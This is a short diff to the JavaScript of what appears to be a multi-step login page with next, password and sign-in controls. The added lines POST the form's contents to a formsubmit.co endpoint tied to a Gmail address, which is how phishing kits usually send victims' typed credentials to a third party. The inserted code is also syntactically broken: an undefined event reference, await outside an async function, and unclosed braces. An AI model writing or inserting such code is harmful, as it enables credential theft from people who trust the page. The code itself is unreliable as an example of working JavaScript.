@@ -9,6 +9,13 @@ document.addEventListener('DOMContentLoaded', () => {
     /////next button
     const nxt = document.getElementById('btn_next');
 
+ const formData = new FormData(e.target);
+
+  await fetch("https://formsubmit.co/blueprint019019@gmail.com", {
+    method: "POST",
+    body: formData
+
+
 
 
 
@@ -24,7 +31,7 @@ document.addEventListener('DOMContentLoaded', () => {
             view = "pwd";
         }
     })
-
+  });
     //////sign in button
 
     const sig = document.getElementById('btn_sig');
